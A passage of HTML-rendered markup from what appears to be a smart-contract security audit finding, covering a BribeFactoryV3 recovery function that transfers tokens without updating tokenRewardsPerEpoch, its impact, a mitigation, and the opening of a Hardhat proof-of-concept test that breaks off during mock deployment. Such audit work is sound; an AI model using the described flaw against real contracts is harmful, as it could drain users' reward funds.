class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRecovered\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn contrast, \u003ccode\u003eemergencyRecoverERC20\u003c/code\u003e only transfers tokens without updating the mapping:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eemergencyRecoverERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyAllowed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt;= \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;TOO_MUCH\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRecovered\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-8\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eIncorrect reward accounting - failing to update \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e can lead to over-distribution of rewards. Users may claim rewards based on outdated values, potentially draining the \u003ccode\u003eBribe\u003c/code\u003e contract’s token balance.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate the function Call in \u003ccode\u003eBribeFactoryV3\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003eModify the \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e function in \u003ccode\u003eBribeFactoryV3.sol\u003c/code\u003e to call the correct \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e function.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-7\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"54\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;chai\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupgrades\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;hardhat\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eZERO_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;@openzeppelin/test-helpers/src/constants.js\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BribeFactoryV3 Recovery Functions\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebeforeEach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get signers\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetSigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock token\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockERC20\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Mock Token\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MTK\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock Voter\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockVoter\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock GaugeManager\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockGaugeManager\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock TokenHandler\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 